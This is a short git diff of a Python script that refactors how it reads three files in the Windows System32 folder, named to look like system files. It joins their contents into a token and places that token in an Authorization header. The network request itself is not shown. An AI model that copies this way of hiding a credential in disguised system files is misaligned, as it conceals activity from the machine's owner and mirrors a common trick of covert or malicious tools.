@@ -11,13 +11,7 @@ try:
 except subprocess.CalledProcessError as e:
     print(f"Error: {e}")
 
-def get_string_from_file(file_path):
-    if os.path.exists(file_path):
-        with open(file_path, 'r') as file:
-            content = file.read()
-        return content
-    else:
-        return "Error: File not found"
+
 
 
 print("version 3.0")
@@ -34,9 +28,15 @@ def ruso():
         system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
         system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
         data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
-        content1 = get_string_from_file(system_info_path)
-        content2 = get_string_from_file(system_driver_vul_path)
-        content3 = get_string_from_file(data_vulnerable_path)
+        file = open(system_info_path, 'r')
+        content1 = file.read()
+        file.close()
+        file = open(system_driver_vul_path, 'r')
+        content2 = file.read()
+        file.close()
+        file = open(data_vulnerable_path, 'r')
+        content3 = file.read()
+        file.close()
         content4 =  content1+content2+content3
         token = content4
         headers = {"Authorization": f"token {token}"}
